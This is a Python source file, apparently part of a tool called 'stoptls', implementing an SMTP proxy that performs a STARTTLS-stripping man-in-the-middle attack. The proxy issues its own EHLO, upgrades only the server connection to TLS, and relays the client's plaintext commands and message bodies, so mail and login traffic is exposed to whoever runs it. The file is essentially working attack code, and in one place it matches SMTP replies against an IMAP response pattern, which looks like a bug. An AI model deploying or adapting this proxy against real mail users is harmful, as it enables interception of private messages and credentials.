import asyncio
import logging
import socket
import re

from stoptls.tcp.base import TCPProxyConn
from stoptls.tcp import regex

logging.getLogger().setLevel(logging.DEBUG)


class SMTPProxyConn(TCPProxyConn):
    ports = (25, 587)
    command_re = re.compile('^(?P<cmd>\S*)(?P<args> .*)\r?\n$')
    response_re = re.compile('^(?P<status_code>[0-9]{3})(?:(?P<line_cont>-)| )(?P<message>.*)?\r\n$')

    async def strip(self):
        banner = await self.server_reader.readline()
        logging.debug('Received banner: {}'.format(banner))

        self.client_writer.write(banner)
        logging.debug('Writing banner to client...')
        await self.client_writer.drain()

        # Premptively issue an EHLO command.
        # If STARTTLS is supported, we upgrade connection
        client_address, client_port = self.client_writer.get_extra_info('peername')

        try:
            client_hostname = (await asyncio.get_running_loop()
                               .getnameinfo((client_address,
                                             client_port)))
        except socket.gaierror:
            client_hostname = client_address

        self.server_writer.write('EHLO {}\r\n'.format(client_hostname).encode('ascii'))
        await self.server_writer.drain()

        # Process EHLO response.
        # TODO: Move this logic into a method
        ehlo_response = await self.server_reader.readline()
        ehlo_response_re = regex.SMTP_RESPONSE.fullmatch(ehlo_response.decode('ascii'))
        tls_supported = False
        while (not self.server_reader.at_eof() and
               ehlo_response_re and
               ehlo_response_re.group('line_cont')):
            if ehlo_response_re.group('message') and \
               ehlo_response_re.group('message').upper() == 'STARTTLS':
                tls_supported = True

            ehlo_response = await self.server_reader.readline()
            ehlo_response_re = regex.SMTP_RESPONSE.fullmatch(ehlo_response.decode('ascii'))

        if tls_supported:
            await self.start_tls()

        while not self.server_reader.at_eof():
            client_data = await self.client_reader.readline()
            logging.debug('Received client data: {}'.format(client_data))

            client_data_re = regex.SMTP_COMMAND.fullmatch(client_data.decode('ascii'))
            if self.client_reader.at_eof():
                logging.debug('Client closed connection')
                break

            try:
                self.server_writer.write(client_data)
                logging.debug('Writing client data to server...')
                await self.server_writer.drain()
            except ConnectionResetError:
                break

            logging.debug('Reading line from server...')

            server_data = await self.server_reader.readline()

            logging.debug('Received server data: {}'.format(server_data))
            self.client_writer.write(server_data)
            logging.debug('Writing server data to client...')
            await self.client_writer.drain()

            server_data_re = regex.IMAP_RESPONSE.fullmatch(server_data.decode('ascii'))

            if client_data_re:
                if client_data_re.group('cmd').upper() == 'EHLO':
                    # handle EHLO
                    server_data_re = regex.SMTP_RESPONSE.fullmatch(server_data.decode('ascii'))
                    while (not self.server_reader.at_eof() and
                           server_data_re and
                           server_data_re.group('line_cont')):
                        server_data = await self.server_reader.readline()
                        server_data_re = regex.SMTP_RESPONSE.fullmatch(server_data.decode('ascii'))
                        logging.debug('Received server data: {}'.format(server_data))
                        self.client_writer.write(server_data)
                        logging.debug('Writing server data to client...')
                        await self.client_writer.drain()
                elif (client_data_re.group('cmd').upper() == 'DATA' and
                      server_data_re and
                      server_data_re.group('status_code') == '354'):
                    client_data = await self.client_reader.readline()
                    self.server_writer.write(client_data)
                    await self.server_writer.drain()
                    while client_data != b'.\r\n':
                        client_data = await self.client_reader.readline()
                        self.server_writer.write(client_data)
                        await self.server_writer.drain()

                    logging.debug('Reading line from server...')
                    server_data = await self.server_reader.readline()

                    if self.server_reader.at_eof():
                        logging.debug('Server closed connection')
                        break

                    logging.debug('Received server data: {}'.format(server_data))
                    self.client_writer.write(server_data)
                    logging.debug('Writing server data to client...')
                    await self.client_writer.drain()

        await super().strip()
